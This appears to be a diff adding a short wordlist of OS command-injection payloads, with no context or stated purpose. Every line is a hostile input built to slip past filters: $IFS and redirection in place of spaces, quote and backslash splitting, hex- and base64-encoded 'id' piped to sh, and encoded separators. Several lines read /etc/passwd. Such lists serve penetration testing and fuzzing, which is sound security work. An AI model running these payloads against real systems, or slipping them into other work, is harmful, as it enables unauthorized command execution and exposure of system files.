@@ -1,0 +1,12 @@
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+cat</etc/passwd
+c\at /etc/passwd
+c'a't /etc/passwd
+/bin/cat$IFS/etc/passwd
+$(printf '\x69\x64')
+echo${IFS}aWQ=|base64${IFS}-d|sh
+id%09
+id%0a
+;id;#
+|id|
